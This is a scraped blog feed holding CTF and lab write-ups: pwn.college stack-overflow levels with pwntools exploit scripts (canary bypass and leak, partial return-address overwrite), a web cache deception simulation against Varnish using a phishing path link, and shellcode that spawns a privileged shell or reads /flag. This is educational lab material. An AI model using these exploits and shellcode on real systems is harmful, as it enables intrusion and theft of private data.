class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">win_authed</span><span class="hljs-params">(<span class="hljs-type">int</span> token)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (token != <span class="hljs-number">0x1337</span>) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You win! Here is your flag: &quot;</span>);<br>  sendfile(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>So how do you pass the check? There <em>is</em> a way, and we will cover it later,<br>but for now, we will simply bypass it! You can overwrite the return address<br>with <em>any</em> value (as long as it points to executable code), not just the start<br>of functions. Let’s overwrite past the token check in win!</p><p>To do this, we will need to analyze the program with objdump, identify where<br>the check is in the win_authed() function, find the address right after the check, and write that address over the saved return address.</p><p>Go ahead and find this address now. When you’re ready, input a buffer overflow that will overwrite the saved return address (at 0x7fff00d955f8, 120 bytes into the buffer)with the correct value.</p><ul><li>the address of win_authed() is 0x401bcd.<br>这一关需要我们在objdump中看一下win_authed()函数的逻辑，如下所示：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">401bd9:89 7d fc             mov    DWORD PTR [rbp-0x4],edi<br>401bdc:81 7d fc 37 13 00 00 cmp    DWORD PTR [rbp-0x4],0x1337<br>401be3:0f 85 f2 00 00 00    jne    401cdb &lt;win_authed+0x10e&gt;<br></code></pre></td></tr></table></figure>这里是从edi中读数据再进行比较，修改edi显然不现实，所以这里的意思是要我们直接把返回地址修改到验证函数通过的地方。查看其汇编代码可以知道如果验证成功将会跳转到：0x401be9，所以这里就是我们的目标了。(其实判断之后的任意地址都可以)<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">r.sendline(b&#x27;\x00&#x27; * 120 + b&#x27;\xe9\x1b\x40&#x27; + b&#x27;\x00&#x27; * 5)<br></code></pre></td></tr></table></figure></li></ul><h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h4><p>That means that you will need to input at least 96 bytes (58 to fill the buffer,<br>30 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>Overwriting the entire return address is fine when we know<br>the whole address, but here, we only really know the last three nibbles.<br>These nibbles never change, because pages are aligned to 0x1000.<br>This gives us a workaround: we can overwrite the least significant byte<br>of the saved return address, which we can know from debugging the binary,<br>to retarget the return to main to any instruction that shares the other 7 bytes.<br>Since that last byte will be constant between executions (due to page alignment),<br>this will always work.<br>If the address we want to redirect execution to is a bit farther away from<br>the saved return address, and we need to write two bytes, then one of those<br>nibbles (the fourth least-significant one) will be a guess, and it will be<br>incorrect 15 of 16 times.<br>This is okay: we can just run our exploit a few<br>times until it works (statistically, after 8 times or so).<br>One caveat in this challenge is that the win_authed() function must first auth:<br>it only lets you win if you provide it with the argument 0x1337.<br>Specifically, the win_authed() function looks something like:<br>    void win_authed(int token)<br>    {<br>      if (token !&#x3D; 0x1337) return;<br>      puts(“You win! Here is your flag: “);<br>      sendfile(1, open(“&#x2F;flag”, 0), 0, 256);<br>      puts(“”);<br>    }<br>这一题开始有一些变化了，首先程序编程64位的，而且地址也不是静态的了，所以所有的地址都以偏移量表示。从验证函数的汇编代码可以知道其验证成功后跳转的相对地址为0x2411，但只知道这些是不够的。运行程序后可以观察到地址的高位是设置好的，并且由于页的对其机制最后三位也是不变的，所以我们只需要猜一位，也就是最高半个字节即可。最多需要测试16次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level7.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;90&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;\x11\x24&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure><h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h4><p>That means that you will need to input at least 176 bytes (119 to fill the buffer, 49 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address<br>这一题和上一题是一样的，地址变为0x2075.</p><h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h4><p>That means that you will need to input at least 48 bytes (17 to fill the buffer,<br>23 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>While canaries are enabled, this program reads your input 1 byte at a time,<br>tracking how many bytes have been read and the offset from your input buffer to read the byte to using a local variable on the stack.<br>The code for doing this looks something like:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">while</span> (n &lt; size) &#123;<br>n += read(<span class="hljs-number">0</span>, input + n, <span class="hljs-number">1</span>);    <br>&#125;<br></code></pre></td></tr></table></figure><p>As it turns out, you can use this local variable <code>n</code> to jump over the canary.<br>Your input buffer is stored at 0x7ffcdb26f150, and this local variable <code>n</code><br>is stored 20 bytes after it at 0x7ffcdb26f164.</p><p>When you overwrite <code>n</code>, you will change the program’s understanding of<br>how many bytes it has read in so far, and when it runs <code>read(0, input + n, 1)</code> again, it will read into an offset that you control.<br>This will allow you to reposition the write <em>after</em> the canary, and write<br>into the return address!</p><p>The payload size is deceptively simple.<br>You don’t have to think about how many bytes you will end up skipping:<br>with the while loop described above, the payload size marks the<br><em>right-most</em> byte that will be read into.<br>As far as this challenge is concerned, there is no difference between bytes<br>“skipped” by fiddling with <code>n</code> and bytes read in normally: the values<br>of <code>n</code> and <code>size</code> are all that matters to determine when to stop reading,<br><em>not</em> the number of bytes actually read in.</p><p>That being said, you <em>do</em> need to be careful on the sending side: don’t send<br>the bytes that you’re effectively skipping!</p><p>跳转地址：0x15bf</p><p>从这一题开始canary就不再禁用了，也就是说不能像之前的题目一样直接写buffer了。这一题给我们提供了一种跳过canary 的简单方式，就是用上面的变量<code>n</code>，通过改变n的值就可以直接跳到canary之后。<br><code>n</code>的位置：0x8074，返回地址的位置：0x8088<br>因此可以先写入20字节空，在第21字节将<code>n</code>修改为40(0x24)，即可修改地址为跳转地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level9.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;42&quot;</span>)<br>r.send(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">20</span> + <span class="hljs-string">b&#x27;\x27&#x27;</span> + <span class="hljs-string">b&#x27;\xbf\x15&#x27;</span>)<br><span class="hljs-comment"># r.interactive()</span><br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure><h4 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h4><p>In this level, the flag will be loaded into memory.<br>However, at no point will this program actually print the buffer storing the flag.<br>这一题很有意思，题目说flag已经在内存里了，而且存在buffer后108字节的位置，但是不会有任何函数会打印flag，但是会打印我们插入的内容。所以我们只需要将空字节全部填充（包括最后的null termination）即可将flag一起打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level10.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;108&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">108</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h4><p>这一题flag同样会被存入内存，但是输入buffer会被映射到页中。buffer到flag共32768字节。按上一题的方法即可得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level11.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;32768&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">32768</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h4><p>That means that you will need to input at least 80 bytes (51 to fill the buffer,<br>21 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>Because the binary is position independent, you cannot know<br>exactly where the win_authed() function is located.<br>This means that it is not clear what should be written into the return address.<br>This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts(), call to see the hidden backdoor!<br>题目说这一题有个后门，查看源码后看到在这个puts()后面确实有一个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C">iVar3 = <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;REPEAT&quot;</span>);<br><span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>uVar2 = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">puts</span>();<br>uVar2 = challenge((<span class="hljs-type">uint64_t</span>)(<span class="hljs-type">uint32_t</span>)var_64h, var_70h, var_78h);<br>&#125;<br></code></pre></td></tr></table></figure><p>意思是说，如果输入buffer中有REPEAT这个字符串，就会重新进入challenge，而第二次进入挑战时canary是不变的，所以我们就可以第一次输入REPEAT获得canary，第二次直接覆盖。<br>这题可把我坑了半天，原因就是一个小小的p64()，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>r = process(<span class="hljs-string">&quot;/challenge/babymem_level12.0&quot;</span>)<br>payload1 = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">49</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br><br>r.sendlineafter(<span class="hljs-string">b&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload1)))<br><br>r.sendafter(<span class="hljs-string">b&#x27;bytes)!\n&#x27;</span>, payload1)<br>r.recvuntil(<span class="hljs-string">&quot;- the canary value is now 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(r.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;addr =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(addr)))<br><br>r.sendline(<span class="hljs-string">&quot;74&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">56</span> + p64(addr) + <span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;\xa3\x24&#x27;</span>)<br><br><span class="hljs-comment">#r.send(b&#x27;\x00&#x27; * 8 + b&#x27;\xa3\x24&#x27;)</span><br><span class="hljs-comment">#r.interactive()</span><br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure><h4 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h4><p>This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?</p><p>The flag was read into address 0x7ffc354390b2.</p><p>The challenge() function has just been launched!<br>However… An important initialisation step was missed.<br>Use this to your advantage!<br>这题搞得我有点懵，看了半天不知道从哪入手。再一看存flag的地址有数据，直接复制出去发现就是flag。。</p><h4 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h4><p>This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()<br>call to see the hidden backdoor!<br>That means that you will need to input at least 352 bytes (325 to fill the buffer,<br>19 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>这一关同样是有后门，拖到Cutter中看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C">iVar3 = <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;REPEAT&quot;</span>);<br><span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>uVar2 = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">puts</span>();<br>uVar2 = challenge((<span class="hljs-type">uint64_t</span>)(<span class="hljs-type">uint32_t</span>)var_174h, var_180h, var_188h);<br>&#125;<br></code></pre></td></tr></table></figure><p>是和上面一样的输入REPEAT就重启。<br>buffer -&gt; canary: 328<br>canary: 8<br>canary -&gt; return: 8<br>return: 1fbc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>r = process(<span class="hljs-string">&quot;/challenge/babymem_level14.0&quot;</span>)<br>payload1 = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">49</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br><br>r.sendlineafter(<span class="hljs-string">b&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload1)))<br><br>r.sendafter(<span class="hljs-string">b&#x27;bytes)!\n&#x27;</span>, payload1)<br>r.recvuntil(<span class="hljs-string">&quot;- the canary value is now 0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(r.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;addr =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(canary)))<br>r.sendline(<span class="hljs-string">&quot;346&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">328</span> + p64(canary) + <span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;\xbc\x1f&#x27;</span>)<br><span class="hljs-comment">#r.interactive()</span><br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure><h4 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h4><p>from pwn import *<br>r &#x3D; process(“&#x2F;challenge&#x2F;babymem_level15.0”)<br>s &#x3D; remote(‘localhost’,1337, typ&#x3D;’tcp’)</p><p>That means that you will need to input at least 48 bytes (19 to fill the buffer,<br>21 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>While canaries are enabled, this networked program forks.<br>What is important to note is that the canary does not get re-randomized on fork.<br>When data that you are overflowing into is critical (i.e., if you screw it up<br>the program crashes), but also static across executions, you can brute-force<br>it byte by byte over many attempts.</p><p>So, let’s brute-force the canary!<br>If this is your first time running this program, all you know so far is that<br>the canary has a 0 as its left-most byte.<br>You should proceed like this:</p><ul><li>First, you should try overflowing just the null byte of the canary, for<br>practice. The canary starts at 0x7ffef4ed8c88, which is 24 bytes after the<br>start of your buffer. Thus, you should provide 24 characters followed<br>by a NULL byte, make sure the canary check passes, then try a non-NULL<br>byte and make sure the canary check fails. This will confirm the offsets.</li><li>Next try each possible value for just the next byte. One of them (the same<br>as whatever was there in memory already) will keep the canary intact, and<br>when the canary check succeeds, you know you have found the correct one.</li><li>Go on to the next byte, leak it the same way, and so on, until you have<br>the whole canary.</li></ul><p>You will likely want to script this process! Each byte might take up to 256<br>tries to guess..</p><p>地址：0x1ce5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">from pwn import *<br>r = process(&quot;/challenge/babymem_level15.0&quot;)<br>s = remote(&#x27;localhost&#x27;,1337, typ=&#x27;tcp&#x27;)<br>t = remote(&#x27;localhost&#x27;,1337, typ=&#x27;tcp&#x27;)<br>payload1 = b&#x27;REPEAT&#x27; + b&#x27;a&#x27;*4 + b&#x27;b&#x27;<br><br>s.sendlineafter(b&#x27;Payload size: &#x27;, str(len(payload1)))<br>s.sendafter(b&#x27;bytes)!\n&#x27;, payload1)<br>s.recvuntil(&quot;- the canary value is now 0x&quot;)<br>canary = int(s.recvline()[:-2], 16)<br>log.success(&quot;canary =&gt; &#123;&#125;&quot;.format(hex(canary)))<br><br>t.sendline(&quot;42&quot;)<br>t.sendline(b&#x27;\xaa&#x27; * 24 + p64(canary) + b&#x27;\xaa&#x27; * 8 + b&#x27;\xe5\x1c&#x27;)<br>t.interactive()<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">print</span>(t.readall())</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>pwn.college</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web Cache Deception Attack Simulation</title>
    <link href="/2022/03/11/2022-3-11-Computer-Security-II-Web-Cache-Deception/"/>
    <url>/2022/03/11/2022-3-11-Computer-Security-II-Web-Cache-Deception/</url>
    
    <content type="html"><![CDATA[<h1 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h1><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><ul><li>Platform: Ubuntu Linux 20.04 64bit virtual machine.</li><li>Softwares:<ul><li>Web server: Apache2 + MySQL + PHP</li><li>Cache server: Varnish 6.6</li></ul></li></ul><h2 id="Environment-setup"><a href="#Environment-setup" class="headerlink" title="Environment setup"></a>Environment setup</h2><h3 id="Step-1-Install-Apache2-web-server-PHP-and-MySQL"><a href="#Step-1-Install-Apache2-web-server-PHP-and-MySQL" class="headerlink" title="Step 1: Install Apache2 web server, PHP and MySQL"></a>Step 1: Install Apache2 web server, PHP and MySQL</h3><p>To cache webpages, we first need to have a web server. In this case, we chose the commonly used web server Apache2. The command to install:<br><code>$ sudo apt install apache2</code><br>Once the installation has finished, we can start Apache2 by running:<br><code>$ sudo systemctl start apache2</code><br>Because our website requires user login, we use MySQL as our database and uses PHP to connect the database and the web server <strong>[uncertain about this]</strong></p><h3 id="Step-2-Install-Varnish-cache-service"><a href="#Step-2-Install-Varnish-cache-service" class="headerlink" title="Step 2: Install Varnish cache service"></a>Step 2: Install Varnish cache service</h3><p>To enable webpage caching, a caching server is needed. In this case, we chose Varnish. This time, we built Varnish 6.6 from source.</p><p>Then we can start varnish with the following command where <code>default.vcl</code> is the configuration we use.<br><code>$ sudo varnishd -f /etc/varnish/default.vcl</code></p><h3 id="Step-3-Apache-and-Varnish-configuration"><a href="#Step-3-Apache-and-Varnish-configuration" class="headerlink" title="Step 3: Apache and Varnish configuration"></a>Step 3: Apache and Varnish configuration</h3><p>By default, Apache server listens on HTTP port 80 for all incoming connections. Since we intended to place Varnish in the middle of the connection to forward all the requests, we need to configure the Varnish to listen to port 80 and Apache to listen to a different port, in this case, is port 8080.</p><p>To configure Apache HTTP listening port, we edited the file:<br><code>$ sudo vim /etc/apache2/ports.conf</code></p><!--screenshot here--><p>Also we need to change the default virtual host of apache:<br><code>$ sudo vim /etc/apache2/sites-emabled/000-default.conf</code></p><!--screenshot here--><h3 id="Step-4-Configure-Varnish-to-listen-to-port-80"><a href="#Step-4-Configure-Varnish-to-listen-to-port-80" class="headerlink" title="Step 4: Configure Varnish to listen to port 80"></a>Step 4: Configure Varnish to listen to port 80</h3><p>Now restart Apache and we can access our website via port 8080. The next step is to configure the Varnish to listen to port 80 so that it can forward HTTP requests to the Apache web server and also enable webpage caching. Edit the following file:<br><code>$ sudo vim /etc/default/varnish</code><br>Change the value of <code>DAEMON_OPTS</code> to <code>-a :80</code>. Then, in file <code>/etc/varnish/default.vcl</code>, change the <code>backend_default</code> entry to the local IP address and port to 80.<br>Finally, edit the file <code>/lib/systemd/system/varnish.service</code> and modify the port <code>ExecStart</code> from the default port 6081 to 80.<br>Now we need to restart all the services to make all the configuration come to effect.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart apache2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl daemon-reload</span><br></code></pre></td></tr></table></figure><p>And we can easily test if the services are running properly using the command where <code>10.0.2.15</code> is the IP address of this machine.<br><code>$ curl -I 10.0.2.15</code><br><!screenshot here></p><h3 id="Step-5-Configure-Varnish-for-webpage-cache"><a href="#Step-5-Configure-Varnish-for-webpage-cache" class="headerlink" title="Step 5: Configure Varnish for webpage cache"></a>Step 5: Configure Varnish for webpage cache</h3><p>In order to enable webpage cache, we need some configuration of the Varnish.<br>Because we will use <code>curl</code> to determine if the request is a “Hit” or a “Miss”, we add the following rules to the Varnish configuration file.</p><!--code here--><p>Also, in real world settings, there must be some rules specifying what kind of pages or elements should be cached or should not be cached. In our website, all the pages are php files and the profile.php contains sensitive information about the user. So we set a rule that all pages with extension type php should not be cached.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> (req.url ~ <span class="hljs-string">&quot;^[^?]\.(php)(\?.)?$&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">pass</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>On the other hand, some of the elements should be cached to accelerate the request, so we have another rule specifying some types of files that are commonly cached, such as the css files and jpg files.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> (req.url ~ <span class="hljs-string">&quot;^[^?]\.(css|jpg|js|gif|png|xml|flv|gz|txt|...)(\?.)?$&quot;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-built_in">hash</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Till now, we are basically ready to perform the attack.</p><h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><p>In this web cache deception attack, we will try to illustrate the whole scenario from the attacker and the victim aspect.</p><h3 id="Step-1-Information-gathering"><a href="#Step-1-Information-gathering" class="headerlink" title="Step 1: Information gathering"></a>Step 1: Information gathering</h3><p>The victim:<br>Has an account on the website, the account has sensitive information about the victim, namely: phone number, email, etc.</p><p>The attacker:<br>Would like to steal personal information about the victim. It first registers its own account, by doing this, it knows the possible information it can get as well as the website sub domain it is going to make use of, the &#x2F;profile.php.</p><h3 id="Step-2-Path-forgery-and-phishing-attack"><a href="#Step-2-Path-forgery-and-phishing-attack" class="headerlink" title="Step 2: Path forgery and phishing attack"></a>Step 2: Path forgery and phishing attack</h3><p>Because of the “Path Confusion”, the attacker forges a link requesting for some non-exist files, for example <code>10.0.2.15/profile.php/nothing.css</code>, and tries to lure the victim to click this link. By default, <code>/profile.php</code> would not be cached by Varnish based on the first rule mentioned, however, by requesting this path, Varnish would reckon it as a <code>css</code> file, thus it will cache the page because of the second rule.<br>Now the attacker can access the same site <code>10.0.2.15/profile.php/nothing.css</code>, and Varnish will directly return the cached page along with all the sensitive information within it to the attacker.</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn.college: Shellcode Injection</title>
    <link href="/2022/03/07/2022-3-7-Shellcode-Injection/"/>
    <url>/2022/03/07/2022-3-7-Shellcode-Injection/</url>
    
    <content type="html"><![CDATA[<h4 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0) */<br>    /* push b&#x27;/bin///sh\x00&#x27; */<br>    push 0x68<br>    mov rax, 0x732f2f2f6e69622f<br>    push rax<br>    mov rdi, rsp<br>    /* push argument array [&#x27;sh\x00&#x27;, &#x27;-p\x00&#x27;] */<br>    /* push b&#x27;sh\x00-p\x00&#x27; */<br>    mov rax, 0x101010101010101<br>    push rax<br>    mov rax, 0x101010101010101 ^ 0x702d006873<br>    xor [rsp], rax<br>    xor esi, esi /* 0 */<br>    push rsi /* null terminate */<br>    push 0xb<br>    pop rsi<br>    add rsi, rsp<br>    push rsi /* &#x27;-p\x00&#x27; */<br>    push 0x10<br>    pop rsi<br>    add rsi, rsp<br>    push rsi /* &#x27;sh\x00&#x27; */<br>    mov rsi, rsp<br>    xor edx, edx /* 0 */<br>    /* call execve() */<br>    push SYS_execve /* 0x3b */<br>    pop rax<br>    syscall<br></code></pre></td></tr></table></figure><h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rbx, 0x00000067616c662f# push &quot;/flag&quot; filename<br>push rbx<br>mov rax, 2# syscall number of open<br>mov rdi, rsp# point the first argument at stack (&quot;/flag&quot;).<br>mov rsi, 0# NULL out the second argument (meaning, O_RDONLY).<br>syscall# trigger open(&quot;/flag&quot;, NULL).<br><br>mov rdi, 1# first argument to sendfile is the file descriptor to output to (stdout).<br>mov rsi, rax# second argument is the file descriptor returned by open<br>mov rdx, 0# third argument is the number of bytes to skip from the input file<br>mov r10, 1000# fourth argument is the number of bytes to transfer to the output file<br>mov rax, 40# syscall number of sendfile<br>syscall# trigger sendfile(1, fd, 0, 1000).<br><br>mov rax, 60# syscall number of exit<br>syscall# trigger exit().<br></code></pre></td></tr></table></figure><h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 